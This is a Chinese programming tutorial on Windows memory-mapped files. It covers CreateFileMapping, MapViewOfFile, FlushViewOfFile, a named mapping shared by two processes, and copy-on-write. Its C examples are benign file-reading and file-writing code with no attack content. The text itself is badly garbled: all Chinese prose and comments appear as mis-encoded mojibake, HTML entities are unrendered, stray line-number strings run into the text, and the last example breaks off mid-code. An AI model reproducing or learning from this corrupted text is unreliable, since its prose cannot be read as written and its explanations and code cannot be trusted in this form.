MapViewOfFileï¼Œå°±æ˜¯å°†è§†å›¾ï¼ˆView)ï¼ˆè§†å›¾æŒ‡è¿›ç¨‹ä¸­çš„è™šæ‹Ÿåœ°å€ç©ºé—´ï¼‰å’Œç‰©ç†é¡µè¿›è¡Œå…³è”ï¼ˆMapï¼‰ã€‚ éšåï¼Œè¿›ç¨‹ä½¿ç”¨æŒ‡é’ˆæ¥æ“ä½œè¯¥è§†å›¾ï¼ˆView)ï¼Œè¯»å†™æ–‡ä»¶å°±å¦‚åŒè¯»å†™å†…å­˜ä¸€æ ·ç®€å•ã€‚ å¥½å¤„ï¼š è¯»å†™è‡ªèº«å†…å­˜æ›´æ–¹ä¾¿ å½“ç›®æ ‡æ–‡ä»¶æ˜¯å¤§æ–‡ä»¶ï¼Œè¯»å†™è‡ªèº«å†…å­˜æ•ˆç‡é«˜ï¼ŒI/Oæ“ä½œæ•ˆç‡ä½ è¿™å—å†…å­˜æ˜¯å…±äº«å†…å­˜ï¼Œå¯ä»¥è·¨è¿›ç¨‹å…±äº«æ•°æ® ä¾‹å†…å­˜æ˜ å°„æ–‡ä»¶-è¯»æ–‡ä»¶å†…å­˜æ˜ å°„æ–‡ä»¶-å†™æ–‡ä»¶ç¨‹åºä¸­ä½¿ç”¨CreateFileåˆ›å»ºC:\\A.txtæ–‡ä»¶çš„æ–‡ä»¶å¥æŸ„ï¼Œä¸ºè¯¥æ–‡ä»¶åˆ›å»ºå†…å­˜æ˜ å°„æ–‡ä»¶ï¼Œè¯»è‡ªèº«çš„çº¿æ€§åœ°å€ï¼Œæ‰“å°è¯¥æ–‡ä»¶å‰4å­—èŠ‚å†…å®¹åˆ°cmdä¸Šã€‚C:\\\\A.txtæ–‡ä»¶å†…å®¹10000000000000000000123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; const char *lpcFile = &quot;C:\\\\A.txt&quot;; // ç›®æ ‡æ–‡ä»¶è·¯å¾„ HANDLE hFile; HANDLE hMapFile; LPVOID lpAddr; // æ‰“å¼€æ–‡ä»¶ hFile = CreateFile( lpcFile, // æ–‡ä»¶è·¯å¾„ GENERIC_READ | GENERIC_WRITE, // è®¿é—®æ¨¡å¼ï¼šè¯»å†™ 0, // å…±äº«æ¨¡å¼ï¼šä¸å…±äº« NULL, // å®‰å…¨å±æ€§ï¼šé»˜è®¤ OPEN_EXISTING, // æ‰“å¼€ç°æœ‰çš„æ–‡ä»¶ FILE_ATTRIBUTE_NORMAL, // æ–‡ä»¶å±æ€§ï¼šæ™®é€šæ–‡ä»¶ NULL // æ¨¡æ¿æ–‡ä»¶å¥æŸ„ï¼šä¸ä½¿ç”¨ ); // åˆ¤æ–­CreateFileæ˜¯å¦æ‰§è¡ŒæˆåŠŸ if (hFile == INVALID_HANDLE_VALUE) &#123; printf(&quot;CreateFile failed: %d &quot;, GetLastError()); return 1; // æ›´æ­£è¿”å›å€¼ï¼Œé€šå¸¸åœ¨é”™è¯¯æ—¶è¿”å›éé›¶å€¼ &#125; // åˆ›å»ºæ–‡ä»¶æ˜ å°„å¯¹è±¡ hMapFile = CreateFileMapping( hFile, // æ–‡ä»¶å¥æŸ„ NULL, // é»˜è®¤å®‰å…¨çº§åˆ« PAGE_READWRITE, // å¯è¯»å¯å†™ä¿æŠ¤ 0, // æ˜ å°„å¯¹è±¡çš„å¤§å°çš„é«˜32ä½ 0, // æ˜ å°„å¯¹è±¡çš„å¤§å°çš„ä½32ä½ï¼Œ0è¡¨ç¤ºæ˜ å°„æ•´ä¸ªæ–‡ä»¶ NULL // æ˜ å°„å¯¹è±¡çš„åå­—ï¼ŒNULLè¡¨ç¤ºä¸å‘½å ); // åˆ¤æ–­CreateFileMappingæ˜¯å¦æ‰§è¡ŒæˆåŠŸ if (hMapFile == NULL) &#123; printf(&quot;CreateFileMapping failed: %d &quot;, GetLastError()); CloseHandle(hFile); // å¦‚æœå¤±è´¥ï¼Œå…³é—­æ–‡ä»¶å¥æŸ„ return 1; &#125; // å°†æ–‡ä»¶æ•°æ®æ˜ å°„åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´ lpAddr = MapViewOfFile( hMapFile, // æ–‡ä»¶æ˜ å°„å¯¹è±¡å¥æŸ„ FILE_MAP_ALL_ACCESS, // è¯·æ±‚è¯»å†™è®¿é—®æƒ 0, // æ–‡ä»¶æ•°æ®çš„èµ·å§‹åç§»é‡çš„é«˜32ä½ 0, // æ–‡ä»¶æ•°æ®çš„èµ·å§‹åç§»é‡çš„ä½32ä½ 0 // æ˜ å°„è§†å›¾çš„å¤§å°ï¼Œ0è¡¨ç¤ºä»åç§»é‡åˆ°æ–‡ä»¶æœ«å°¾ ); // åˆ¤æ–­MapViewOfFileæ˜¯å¦æ‰§è¡ŒæˆåŠŸ if (lpAddr == NULL) &#123; printf(&quot;MapViewOfFile failed: %d &quot;, GetLastError()); CloseHandle(hMapFile); // å¦‚æœå¤±è´¥ï¼Œå…³é—­æ˜ å°„å¯¹è±¡å¥æŸ„ CloseHandle(hFile); // å…³é—­æ–‡ä»¶å¥æŸ„ return 1; &#125; // è¯»å–æ˜ å°„è§†å›¾çš„æœ€å¼€å§‹çš„4ä¸ªå­—èŠ‚ DWORD dwTest1 = *(LPDWORD)lpAddr; // å°†lpAddrå¼ºåˆ¶è½¬æ¢ä¸ºLPDWORDç„¶åè§£å¼•ç”¨è·å–DWORDå€¼ printf(&quot;First 4 bytes of the file in hexadecimal: %08x &quot;, dwTest1); // æ¸…ç†èµ„æº UnmapViewOfFile(lpAddr); // å–æ¶ˆæ˜ å°„ CloseHandle(hMapFile); // å…³é—­æ–‡ä»¶æ˜ å°„å¯¹è±¡çš„å¥æŸ„ CloseHandle(hFile); // å…³é—­æ–‡ä»¶çš„å¥æŸ„ return 0;&#125;å­—ç¬¦0çš„ASCIIç æ˜¯0x30FileMappingä¸ºäº†ä¿è¯æ•ˆç‡ï¼Œå®ƒä¸æ˜¯å®æ—¶å†™å…¥ï¼Œè€Œæ˜¯å°†ä¿®æ”¹å…ˆå­˜åˆ°ç¼“å­˜ä¸­ã€‚å½“ç³»ç»Ÿçš„å†™å…¥ç¼“å†²åŒºæ»¡æ—¶ç”±æ“ä½œç³»ç»Ÿå†³å®šä½•æ—¶åˆ·æ–°åˆ°ç£ç›˜ï¼Œæˆ–æ˜¯åœ¨UnmapViewOfFileè°ƒç”¨æ—¶å†™å›æ–‡ä»¶ã€‚éœ€è¦é©¬ä¸Šå†™å…¥çš„è¯è¦è°ƒç”¨FlushViewOfFileå‡½æ•°æ¥å¼ºåˆ¶æ›´æ–°ç¼“å­˜ï¼Œå°†è§†å›¾ç«‹å³ å†™å›æ–‡ä»¶ã€‚FlushViewOfFile1234BOOL FlushViewOfFile( [in] LPCVOID lpBaseAddress, //è¦åˆ·æ–°çš„ç¼“å­˜çš„åœ°å€ [in] SIZE_T dwNumberOfBytesToFlush //è¦åˆ·æ–°çš„å­—èŠ‚æ•°ï¼Œå¦‚æœä¸º0åˆ™å°†æ•´ä¸ªè§†å›¾éƒ½å†™å›);ç¨‹åºä¸­ä½¿ç”¨CreateFileåˆ›å»ºC:\\A.txtæ–‡ä»¶çš„æ–‡ä»¶å¥æŸ„ï¼Œä¸ºè¯¥æ–‡ä»¶åˆ›å»ºå†…å­˜æ˜ å°„æ–‡ä»¶ï¼Œè¯»è‡ªèº«çš„çº¿æ€§åœ°å€ï¼Œæ‰“å°è¯¥æ–‡ä»¶å‰4å­—èŠ‚å†…å®¹åˆ°cmdä¸Šï¼Œç„¶åä¿®æ”¹è¿™4å­—èŠ‚å†…å®¹éƒ½ä¸ºå­—ç¬¦Aï¼Œå†æ¬¡æ‰“å°è¯¥æ–‡ä»¶å‰4å­—èŠ‚å†…å®¹åˆ°cmdä¸Šã€‚CreateFileæ—¶æ”¹ä¸ºå…±äº«è¯»ï¼Œæ–¹ä¾¿è°ƒè¯•æ—¶çœ‹A.txtæ–‡ä»¶çš„ä¿®æ”¹æƒ…å†µ1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; const char *lpcFile = &quot;C:\\\\A.txt&quot;; // ç›®æ ‡æ–‡ä»¶è·¯å¾„ HANDLE hFile; HANDLE hMapFile; LPVOID lpAddr; // æ‰“å¼€æ–‡ä»¶ hFile = CreateFile( lpcFile, // æ–‡ä»¶è·¯å¾„ GENERIC_READ | GENERIC_WRITE, // è®¿é—®æ¨¡å¼ï¼šè¯»å†™+ FILE_SHARE_READ, // å…±äº«æ¨¡å¼ï¼šå…±äº«è¯» NULL, // å®‰å…¨å±æ€§ï¼šé»˜è®¤ OPEN_EXISTING, // æ‰“å¼€ç°æœ‰çš„æ–‡ä»¶ FILE_ATTRIBUTE_NORMAL, // æ–‡ä»¶å±æ€§ï¼šæ™®é€šæ–‡ä»¶ NULL // æ¨¡æ¿æ–‡ä»¶å¥æŸ„ï¼šä¸ä½¿ç”¨ ); // åˆ¤æ–­CreateFileæ˜¯å¦æ‰§è¡ŒæˆåŠŸ if (hFile == INVALID_HANDLE_VALUE) &#123; printf(&quot;CreateFile failed: %d &quot;, GetLastError()); return 1; // æ›´æ­£è¿”å›å€¼ï¼Œé€šå¸¸åœ¨é”™è¯¯æ—¶è¿”å›éé›¶å€¼ &#125; // åˆ›å»ºæ–‡ä»¶æ˜ å°„å¯¹è±¡ hMapFile = CreateFileMapping( hFile, // æ–‡ä»¶å¥æŸ„ NULL, // é»˜è®¤å®‰å…¨çº§åˆ« PAGE_READWRITE, // å¯è¯»å¯å†™ä¿æŠ¤ 0, // æ˜ å°„å¯¹è±¡çš„å¤§å°çš„é«˜32ä½ 0, // æ˜ å°„å¯¹è±¡çš„å¤§å°çš„ä½32ä½ï¼Œ0è¡¨ç¤ºæ˜ å°„æ•´ä¸ªæ–‡ä»¶ NULL // æ˜ å°„å¯¹è±¡çš„åå­—ï¼ŒNULLè¡¨ç¤ºä¸å‘½å ); // åˆ¤æ–­CreateFileMappingæ˜¯å¦æ‰§è¡ŒæˆåŠŸ if (hMapFile == NULL) &#123; printf(&quot;CreateFileMapping failed: %d &quot;, GetLastError()); CloseHandle(hFile); // å¦‚æœå¤±è´¥ï¼Œå…³é—­æ–‡ä»¶å¥æŸ„ return 1; &#125; // å°†æ–‡ä»¶æ•°æ®æ˜ å°„åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´ lpAddr = MapViewOfFile( hMapFile, // æ–‡ä»¶æ˜ å°„å¯¹è±¡å¥æŸ„ FILE_MAP_ALL_ACCESS, // è¯·æ±‚è¯»å†™è®¿é—®æƒ 0, // æ–‡ä»¶æ•°æ®çš„èµ·å§‹åç§»é‡çš„é«˜32ä½ 0, // æ–‡ä»¶æ•°æ®çš„èµ·å§‹åç§»é‡çš„ä½32ä½ 0 // æ˜ å°„è§†å›¾çš„å¤§å°ï¼Œ0è¡¨ç¤ºä»åç§»é‡åˆ°æ–‡ä»¶æœ«å°¾ ); // åˆ¤æ–­MapViewOfFileæ˜¯å¦æ‰§è¡ŒæˆåŠŸ if (lpAddr == NULL) &#123; printf(&quot;MapViewOfFile failed: %d &quot;, GetLastError()); CloseHandle(hMapFile); // å¦‚æœå¤±è´¥ï¼Œå…³é—­æ˜ å°„å¯¹è±¡å¥æŸ„ CloseHandle(hFile); // å…³é—­æ–‡ä»¶å¥æŸ„ return 1; &#125; // è¯»å–æ˜ å°„è§†å›¾çš„æœ€å¼€å§‹çš„4ä¸ªå­—èŠ‚ DWORD dwTest1 = *(LPDWORD)lpAddr; // å°†lpAddrå¼ºåˆ¶è½¬æ¢ä¸ºLPDWORDç„¶åè§£å¼•ç”¨è·å–DWORDå€¼ printf(&quot;First 4 bytes of the file in hexadecimal: %08x &quot;, dwTest1);+ // ä¿®æ”¹æœ€å¼€å§‹çš„4ä¸ªå­—èŠ‚ä¸ºå­—ç¬¦ &#x27;A&#x27;+ memset(lpAddr, &#x27;A&#x27;, 4);+ // åˆ·æ–°ä¿®æ”¹åˆ°ç£ç›˜æ–‡ä»¶+ if (!FlushViewOfFile(lpAddr, 0)) + &#123; // 0è¡¨ç¤ºåˆ·æ–°æ•´ä¸ªæ˜ å°„è§†å›¾+ printf(&quot;FlushViewOfFile failed: %d &quot;, GetLastError());+ &#125;+ // è¯»å–å¹¶æ‰“å°ä¿®æ”¹åçš„4ä¸ªå­—èŠ‚+ dwTest1 = *(LPDWORD)lpAddr;+ printf(&quot;First 4 bytes of the file in hexadecimal after change: %08x &quot;, dwTest1); // æ¸…ç†èµ„æº UnmapViewOfFile(lpAddr); // å–æ¶ˆæ˜ å°„ CloseHandle(hMapFile); // å…³é—­æ–‡ä»¶æ˜ å°„å¯¹è±¡çš„å¥æŸ„ CloseHandle(hFile); // å…³é—­æ–‡ä»¶çš„å¥æŸ„ return 0;&#125; å¤šè¿›ç¨‹å…±äº«å†…å­˜æ˜ å°„æ–‡ä»¶ CreateFileMappingåˆ›å»ºFileMappingç»™è¿™ä¸ªå†…æ ¸å¯¹è±¡èµ·åå­—ï¼Œå…¶ä»–è¿›ç¨‹é€šè¿‡å…·åå¯¹è±¡æ¥æŒ‡å‘åŒä¸€ä¸ªç‰©ç†é¡µï¼Œå› ä¸ºè¿™ä¸ªç‰©ç†é¡µå…³è”äº†æ–‡ä»¶ï¼Œæ‰€ä»¥è¿™ä¸¤ä¸ªè¿›ç¨‹å…±äº«äº†æ–‡ä»¶ã€‚ ä¾‹ç¨‹åºAç¨‹åºBç¨‹åºAä¸­ä½¿ç”¨CreateFileåˆ›å»ºC:\\A.txtæ–‡ä»¶çš„æ–‡ä»¶å¥æŸ„ï¼Œä¸ºè¯¥æ–‡ä»¶åˆ›å»ºå†…å­˜æ˜ å°„æ–‡ä»¶ï¼Œè¯»è‡ªèº«çš„çº¿æ€§åœ°å€ï¼Œæ‰“å°è¯¥æ–‡ä»¶å‰4å­—èŠ‚å†…å®¹åˆ°cmdä¸Šï¼Œç„¶åä¿®æ”¹è¿™4å­—èŠ‚å†…å®¹ä¸ºå­—ç¬¦Aï¼Œå†æ¬¡æ‰“å°è¯¥æ–‡ä»¶å‰4å­—èŠ‚å†…å®¹åˆ°cmdä¸Šï¼Œç„¶ågetchar()é˜»å¡ï¼Œåˆ‡æ¢å»æ‰§è¡Œç¨‹åºBç¨‹åºA1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; const char *lpcFile = &quot;C:\\\\A.txt&quot;; // ç›®æ ‡æ–‡ä»¶è·¯å¾„ HANDLE hFile; HANDLE hMapFile; LPVOID lpAddr; // æ‰“å¼€æ–‡ä»¶ hFile = CreateFile( lpcFile, // æ–‡ä»¶è·¯å¾„ GENERIC_READ | GENERIC_WRITE, // è®¿é—®æ¨¡å¼ï¼šè¯»å†™ 0, // å…±äº«æ¨¡å¼ï¼šä¸å…±äº« NULL, // å®‰å…¨å±æ€§ï¼šé»˜è®¤ OPEN_EXISTING, // æ‰“å¼€ç°æœ‰çš„æ–‡ä»¶ FILE_ATTRIBUTE_NORMAL, // æ–‡ä»¶å±æ€§ï¼šæ™®é€šæ–‡ä»¶ NULL // æ¨¡æ¿æ–‡ä»¶å¥æŸ„ï¼šä¸ä½¿ç”¨ ); // åˆ¤æ–­CreateFileæ˜¯å¦æ‰§è¡ŒæˆåŠŸ if (hFile == INVALID_HANDLE_VALUE) &#123; printf(&quot;CreateFile failed: %d &quot;, GetLastError()); return 1; // æ›´æ­£è¿”å›å€¼ï¼Œé€šå¸¸åœ¨é”™è¯¯æ—¶è¿”å›éé›¶å€¼ &#125; // åˆ›å»ºæ–‡ä»¶æ˜ å°„å¯¹è±¡ hMapFile = CreateFileMapping( hFile, // æ–‡ä»¶å¥æŸ„ NULL, // é»˜è®¤å®‰å…¨çº§åˆ« PAGE_READWRITE, // å¯è¯»å¯å†™ä¿æŠ¤ 0, // æ˜ å°„å¯¹è±¡çš„å¤§å°çš„é«˜32ä½ 0, // æ˜ å°„å¯¹è±¡çš„å¤§å°çš„ä½32ä½ï¼Œ0è¡¨ç¤ºæ˜ å°„æ•´ä¸ªæ–‡ä»¶ &quot;SharedMemoryA&quot; // æ˜ å°„å¯¹è±¡çš„åå­— ); // åˆ¤æ–­CreateFileMappingæ˜¯å¦æ‰§è¡ŒæˆåŠŸ if (hMapFile == NULL) &#123; printf(&quot;CreateFileMapping failed: %d &quot;, GetLastError()); CloseHandle(hFile); // å¦‚æœå¤±è´¥ï¼Œå…³é—­æ–‡ä»¶å¥æŸ„ return 1; &#125; // å°†æ–‡ä»¶æ•°æ®æ˜ å°„åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´ lpAddr = MapViewOfFile( hMapFile, // æ–‡ä»¶æ˜ å°„å¯¹è±¡å¥æŸ„ FILE_MAP_ALL_ACCESS, // è¯·æ±‚è¯»å†™è®¿é—®æƒ 0, // æ–‡ä»¶æ•°æ®çš„èµ·å§‹åç§»é‡çš„é«˜32ä½ 0, // æ–‡ä»¶æ•°æ®çš„èµ·å§‹åç§»é‡çš„ä½32ä½ 0 // æ˜ å°„è§†å›¾çš„å¤§å°ï¼Œ0è¡¨ç¤ºä»åç§»é‡åˆ°æ–‡ä»¶æœ«å°¾ ); // åˆ¤æ–­MapViewOfFileæ˜¯å¦æ‰§è¡ŒæˆåŠŸ if (lpAddr == NULL) &#123; printf(&quot;MapViewOfFile failed: %d &quot;, GetLastError()); CloseHandle(hMapFile); // å¦‚æœå¤±è´¥ï¼Œå…³é—­æ˜ å°„å¯¹è±¡å¥æŸ„ CloseHandle(hFile); // å…³é—­æ–‡ä»¶å¥æŸ„ return 1; &#125; // è¯»å–æ˜ å°„è§†å›¾çš„æœ€å¼€å§‹çš„4ä¸ªå­—èŠ‚ DWORD dwTest1 = *(LPDWORD)lpAddr; // å°†lpAddrå¼ºåˆ¶è½¬æ¢ä¸ºLPDWORDç„¶åè§£å¼•ç”¨è·å–DWORDå€¼ printf(&quot;First 4 bytes of the file in hexadecimal: %08x &quot;, dwTest1); // ä¿®æ”¹æœ€å¼€å§‹çš„4ä¸ªå­—èŠ‚ä¸ºå­—ç¬¦ &#x27;A&#x27; memset(lpAddr, &#x27;A&#x27;, 4); // è¯»å–å¹¶æ‰“å°ä¿®æ”¹åçš„4ä¸ªå­—èŠ‚ dwTest1 = *(LPDWORD)lpAddr; printf(&quot;First 4 bytes of the file in hexadecimal after change: %08x &quot;, dwTest1); getchar(); //é˜»å¡ï¼Œä¾¿äºè§‚å¯Ÿ // æ¸…ç†èµ„æº UnmapViewOfFile(lpAddr); // å–æ¶ˆæ˜ å°„ CloseHandle(hMapFile); // å…³é—­æ–‡ä»¶æ˜ å°„å¯¹è±¡çš„å¥æŸ„ CloseHandle(hFile); // å…³é—­æ–‡ä»¶çš„å¥æŸ„ return 0;&#125;ç¨‹åºBé€šè¿‡è°ƒç”¨OpenFileMappingæ‰“å¼€äº†ç¨‹åºAåˆ›å»ºçš„å…·æœ‰åå­— â€œSharedMemoryAâ€ çš„æ˜ å°„å¯¹è±¡ã€‚ä¹‹åå®ƒå°†æ˜ å°„å¯¹è±¡æ˜ å°„åˆ°è‡ªå·±çš„åœ°å€ç©ºé—´ï¼Œå¹¶è¯»å–æ˜ å°„åŒºåŸŸçš„å‰4ä¸ªå­—èŠ‚ã€‚ç¨‹åºB1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; HANDLE hMapFile; LPVOID lpAddr; // æ‰“å¼€ç°æœ‰çš„æ–‡ä»¶æ˜ å°„å¯¹è±¡ hMapFile = OpenFileMapping( FILE_MAP_ALL_ACCESS, // è¯·æ±‚è¯»å†™è®¿é—®æƒ FALSE, // ç»§æ‰¿å¥æŸ„ï¼šä¸ç»§æ‰¿ &quot;SharedMemoryA&quot; // æ–‡ä»¶æ˜ å°„å¯¹è±¡çš„åå­— ); // åˆ¤æ–­OpenFileMappingæ˜¯å¦æ‰§è¡ŒæˆåŠŸ if (hMapFile == NULL) &#123; printf(&quot;OpenFileMapping failed: %d &quot;, GetLastError()); return 1; &#125; // å°†æ–‡ä»¶æ˜ å°„å¯¹è±¡æ˜ å°„åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´ lpAddr = MapViewOfFile( hMapFile, // æ–‡ä»¶æ˜ å°„å¯¹è±¡å¥æŸ„ FILE_MAP_ALL_ACCESS, // è¯·æ±‚è¯»å†™è®¿é—®æƒ 0, // æ–‡ä»¶æ•°æ®çš„èµ·å§‹åç§»é‡çš„é«˜32ä½ 0, // æ–‡ä»¶æ•°æ®çš„èµ·å§‹åç§»é‡çš„ä½32ä½ 0 // æ˜ å°„è§†å›¾çš„å¤§å°ï¼Œ0è¡¨ç¤ºä»åç§»é‡åˆ°æ–‡ä»¶æœ«å°¾ ); // åˆ¤æ–­MapViewOfFileæ˜¯å¦æ‰§è¡ŒæˆåŠŸ if (lpAddr == NULL) &#123; printf(&quot;MapViewOfFile failed: %d &quot;, GetLastError()); CloseHandle(hMapFile); // å¦‚æœå¤±è´¥ï¼Œå…³é—­æ˜ å°„å¯¹è±¡å¥æŸ„ return 1; &#125; // è¯»å–æ˜ å°„è§†å›¾çš„æœ€å¼€å§‹çš„4ä¸ªå­—èŠ‚ DWORD dwTest1 = *(LPDWORD)lpAddr; // å°†lpAddrå¼ºåˆ¶è½¬æ¢ä¸ºLPDWORDç„¶åè§£å¼•ç”¨è·å–DWORDå€¼ printf(&quot;First 4 bytes of the shared memory in hexadecimal: %08x &quot;, dwTest1); printf(&quot;Process B read&quot;); getchar(); // æ¸…ç†èµ„æº UnmapViewOfFile(lpAddr); // å–æ¶ˆæ˜ å°„ CloseHandle(hMapFile); // å…³é—­æ–‡ä»¶æ˜ å°„å¯¹è±¡çš„å¥æŸ„ return 0;&#125;è®°äº‹æœ¬A.txtè¿è¡Œå‰10000000000000000000è¿è¡Œç¨‹åºAï¼Œä¿®æ”¹A.txtï¼Œç„¶åé˜»å¡åœ¨getchar()ç¨‹åºAè¾“å‡º123First 4 bytes of the file in hexadecimal: 30303030First 4 bytes of the file in hexadecimal after change: 41414141éšåè¿è¡Œç¨‹åºBç¨‹åºBè¾“å‡º12First 4 bytes of the shared memory in hexadecimal: 41414141Process B readè¯´æ˜Aè¿›ç¨‹å¯¹ç‰©ç†é¡µçš„ä¿®æ”¹ï¼ŒBè¿›ç¨‹è¿™è¾¹ä¹Ÿçœ‹åˆ°äº†ã€‚å®ƒä»¬æ˜¯å…±äº«åŒä¸€å—ç‰©ç†é¡µçš„ä¸¤ä¸ªè¿›ç¨‹éƒ½ç»“æŸåï¼ŒA.txtçš„å†…å®¹è¢«ä¿®æ”¹ä¸ºä¸¤ä¸ªç¨‹åºéƒ½ç»“æŸåçš„è®°äº‹æœ¬A.txt1AAAA000000000000000 å†…å­˜æ˜ å°„æ–‡ä»¶ä¹‹å†™æ‹·è´ å‰è¨€ ç³»ç»Ÿçš„DLLæ–‡ä»¶é€šå¸¸é€šè¿‡æ–‡ä»¶æ˜ å°„ï¼ˆFileMappingï¼‰çš„æ–¹å¼ä¸ç‰©ç†å†…å­˜é¡µå…³è”èµ·æ¥ã€‚ä¹‹åï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½å¯ä»¥é€šè¿‡è°ƒç”¨MapViewOfFileå‡½æ•°æ¥å°†è¿™äº›ç‰©ç†é¡µæ˜ å°„åˆ°å®ƒä»¬å„è‡ªçš„è™šæ‹Ÿå†…å­˜ç©ºé—´ã€‚ç»“æœå°±æ˜¯ï¼Œå°½ç®¡è¿™äº›DLLæ–‡ä»¶åœ¨ç‰©ç†å†…å­˜ä¸­åªæœ‰ä¸€ä»½ï¼Œä½†æ¯ä¸ªè¿›ç¨‹çœ‹èµ·æ¥éƒ½å¥½åƒåœ¨å®ƒä»¬å„è‡ªçš„è™šæ‹Ÿç©ºé—´ä¸­ç‹¬ç«‹åŠ è½½äº†DLLã€‚ å½“å¤šä¸ªè¿›ç¨‹è¯»å–è¿™äº›å…±äº«çš„ç‰©ç†é¡µæ—¶ï¼Œå¹¶ä¸ä¼šå¼•èµ·å†²çªã€‚ä½†å¦‚æœæŸä¸ªè¿›ç¨‹é€šè¿‡å®ƒçš„è™šæ‹Ÿåœ°å€ä¿®æ”¹äº†ç‰©ç†é¡µçš„å†…å®¹ï¼Œè¿™ç§æ”¹åŠ¨å°†ä¼šå½±å“åˆ°å…±äº«è¯¥ç‰©ç†é¡µçš„å…¶ä»–è¿›ç¨‹ã€‚ï¼ˆä¸Šé¢çš„ç¨‹åºAå’Œç¨‹åºBå°±å±•ç¤ºäº†è¿™ç§æƒ…å†µï¼šç¨‹åºAä¿®æ”¹äº†å…±äº«ç‰©ç†é¡µçš„å†…å®¹ï¼Œè¿›ç¨‹Béšåè¯»å‡ºäº†è¿™ç§ä¿®æ”¹ã€‚å¹¶ä¸”ç¨‹åºAå’Œç¨‹åºBéƒ½å…³é—­åï¼Œæ–‡ä»¶çš„å†…å®¹ä¹Ÿè¢«æ”¹äº†ã€‚æŠŠè¿™ä¸ªæ–‡ä»¶æ¢æˆç³»ç»Ÿdllï¼ŒåŸç†ä¸€æ ·ã€‚ï¼‰ å®éªŒï¼š å‡è®¾ä½¿ç”¨ODå¯¹æŸä¸ªç¨‹åºAçš„MessageBoxå‡½æ•°ä¸‹æ™®é€šæ–­ç‚¹ï¼Œæ™®é€šæ–­ç‚¹çš„æœ¬è´¨å°±æ˜¯æ›¿æ¢å‡½æ•°ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸º&quot;0xCC&quot;ï¼ˆæ¨¡æ‹Ÿä¿®æ”¹ç‰©ç†é¡µçš„æ“ä½œï¼‰ã€‚å½“ç¨‹åºæ‰§è¡Œåˆ°0xCCï¼ˆå¯¹åº”int 3æ±‡ç¼–æŒ‡ä»¤ï¼‰æ—¶ä¼šåœä¸‹ï¼Œè¿›å…¥è°ƒè¯•çŠ¶æ€ã€‚éšåï¼Œæ‰“å¼€å¦ä¸€ä¸ªè°ƒç”¨MessageBoxçš„ç¨‹åºBæ¥è§‚å¯Ÿå®ƒæ˜¯å¦èƒ½æ­£å¸¸æ‰§è¡ŒMessageBoxå‡½æ•°ã€‚ å¦‚æœï¼š ç¨‹åºBåœ¨æ‰§è¡ŒMessageBoxå‡½æ•°æ—¶è¢«æ–­ä¸‹ï¼Œè¿™è¯´æ˜è¿›ç¨‹Bä¸­MessageBoxå‡½æ•°çš„ç¬¬ä¸€ä¸ªå­—èŠ‚è¢«æ¢æˆäº†0xCC ç¨‹åºBèƒ½å¤Ÿæ­£å¸¸æ‰§è¡ŒMessageBoxå‡½æ•°ï¼Œè¿™è¯´æ˜å­˜åœ¨æŸç§æœºåˆ¶ç¡®ä¿è¿›ç¨‹Aå¯¹å…±äº«ç‰©ç†é¡µçš„ä¿®æ”¹æ²¡æœ‰å½±å“åˆ°è¿›ç¨‹Bã€‚ å†™æ‹·è´ï¼ˆCopy-on-Writeï¼‰ å†™æ‹·è´æœºåˆ¶å°±æ˜¯ç”¨äºé˜²æ­¢è¿™ç±»é—®é¢˜çš„ã€‚å½“æŸä¸ªè¿›ç¨‹å°è¯•å¯¹å…±äº«ç‰©ç†é¡µè¿›è¡Œå†™æ“ä½œæ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šåˆ›å»ºè¯¥ç‰©ç†é¡µçš„ä¸€ä¸ªå‰¯æœ¬ã€‚è¿™æ ·ï¼Œè¯¥è¿›ç¨‹çš„å†™æ“ä½œåªå½±å“è¿™ä¸ªå‰¯æœ¬ï¼Œä¸ä¼šæ³¢åŠå…¶ä»–è¿›ç¨‹ã€‚æ˜ å°„è§†å›¾è§£é™¤åï¼Œæ–‡ä»¶å†…å®¹åŒæ ·ä¸ä¼šå—åˆ°å½±å“ã€‚ å¦‚æœåœ¨è°ƒç”¨MapViewOfFileå‡½æ•°æ—¶ç¬¬äºŒä¸ªå‚æ•°ä½¿ç”¨çš„æ˜¯FILE_MAP_COPYé€‰é¡¹ï¼Œå®ƒæ„å‘³ç€å†™æ“ä½œå°†ä¼šè§¦å‘æ‹·è´ã€‚ä¾‹å¦‚ï¼Œå½“è¿›ç¨‹Aå°è¯•ä¿®æ”¹ç‰©ç†é¡µå†…å®¹æ—¶ï¼Œæ“ä½œç³»ç»Ÿå°†ä¸ºå…¶å†™æ“ä½œåˆ›å»ºä¸€ä¸ªæ–°çš„ç‰©ç†é¡µï¼ˆä¸€ä¸ªç‰©ç†é¡µ4KBå¤§å°ï¼‰ã€‚è¿™æ ·ï¼ŒåŸå§‹ç‰©ç†é¡µåŠå…¶å†…å®¹ï¼ˆåŒ…æ‹¬å…³è”çš„æ–‡ä»¶å†…å®¹ï¼‰ä¸ä¼šå—åˆ°å½±å“ï¼Œè¿›ç¨‹Bçš„æ‰§è¡Œä¹Ÿä¸ä¼šè¢«å¹²æ‰°ã€‚ ä¾‹æŠŠä¸Šé¢ç¨‹åºAå’Œç¨‹åºBçš„MapViewOfFileçš„ç¬¬äºŒä¸ªå‚æ•°éƒ½æ”¹æˆå†™æ‹·è´ç¨‹åºAç¨‹åºB1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; const char *lpcFile = &quot;C:\\\\A.txt&quot;; // ç›®æ ‡æ–‡ä»¶è·¯å¾„ HANDLE hFile; HANDLE hMapFile; LPVOID lpAddr; // 